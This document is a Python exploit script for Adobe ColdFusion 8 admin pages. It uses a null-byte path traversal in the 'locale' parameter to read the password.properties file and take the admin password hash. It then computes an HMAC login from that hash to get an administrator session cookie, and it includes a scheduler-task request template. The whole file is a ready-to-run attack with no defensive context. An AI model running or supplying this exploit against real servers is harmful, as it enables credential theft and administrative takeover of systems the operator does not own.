#!/usr/bin/python3

import sys
import socket
import re
import hashlib
import hmac
import binascii
import time
import http.client as httplib  # Use 'http.client' instead of 'httplib'
import gc

gc.disable()

if len(sys.argv) < 4:
    print("usage: %s <stage> <host> <port>" % sys.argv[0])
    print("example: %s 1 localhost 80" % sys.argv[0])
    print("       : %s 2 localhost 80 <Hash>")
    print("if successful, the file will be printed")
    sys.exit()

host = sys.argv[2]
port = sys.argv[3]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))

filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")
post = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a"""

post_cookie = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

%s"""

get_sched = """GET /CFIDE/administrator/scheduler/scheduleedit.cfm?submit=Schedule+New+Task HTTP/1.1
Host: %s
Connection: close
Cookie: %s
"""

def authenticate(hash):
    global s
    key = str(int(time.time() * 1000)) + "123"
    print(key)
    digest = hashlib.sha1()
    key = key.encode('utf-8')
    hash = hash.encode('utf-8')
    digest.update(hash)
    hmacx = hmac.new(key, digest.digest(), digestmod=hashlib.sha1).hexdigest().upper()
    params = "cfadminPassword=%s&requestedURL=/CFIDE/administrator/enter.cfm?&salt=%s&submit=Login" % (hmacx, key)
    params = params.encode('utf-8')
    f = '/CFIDE/administrator/enter.cfm'
    s.send(post_cookie % (f, host, len(params), params))
    posted = post_cookie % (f, host, len(params), params)
    print("Posted: %s" % posted)
    buf = b''
    while 1:
        buf_s = s.recv(1024)
        if len(buf_s) == 0:
            break
        buf += buf_s
    m = re.findall(b'Set-Cookie: CFAUTHORIZATION_cfadmin=[A-Za-z0-9]+;', buf, re.S)
    if b"CFAUTHORIZATION_cfadmin" in buf:
        print("Cookie Created Successfully")
        print("------------------------------")
        print(m[0].split(b"=")[1].split(b";")[0].decode('utf-8'))
        print("------------------------------")
    return m[0].split(b"=")[1].split(b";")[0].decode('utf-8')

def find_pass():
    global s
    paths = []
    i = 0
    paths.append("../../../../../../../../../../../../../../../ColdFusion8/lib/password.properties")
    while (paths[i][3] != 'C'):
        paths.append(paths[i][3:])
        i = i + 1
    count = 0
    for path in paths:
        for f in filenames:
            print("------------------------------")
            print("trying", f, path)
            count = count + 1
            path = path.encode('utf-8')
            s.send(post.encode() % (f.encode(), host.encode(), len(path) + 14, path))
            posted = post % (f, host, len(path) + 14, path)
            print("Posted: %s" % posted)
            buf = b""
            while 1:
                buf_s = s.recv(1024)
                if len(buf_s) == 0:
                    break
                buf += buf_s
            m = re.search(b'<title>(.*)</title>', buf, re.S)
            if b"password" in buf:
                title = m.groups(0)[0]
                admin_pass = title.split(b"\n")[2].split(b"=")[1]
                print("Password found after %s attempts" % count)
                print("title from server in %s:" % f)
                print("------------------------------")
                print(m.groups(0)[0].decode('utf-8'))
                print("------------------------------")
                return admin_pass.decode('utf-8')

if int(sys.argv[1]) == 1:
    admin_pass = find_pass()
elif int(sys.argv[1]) == 2:
    admin_pass = sys.argv[4]
    cookie = authenticate(admin_pass)
else:
    print("Currently your stage is unavailable, please use one of the prepared stages")
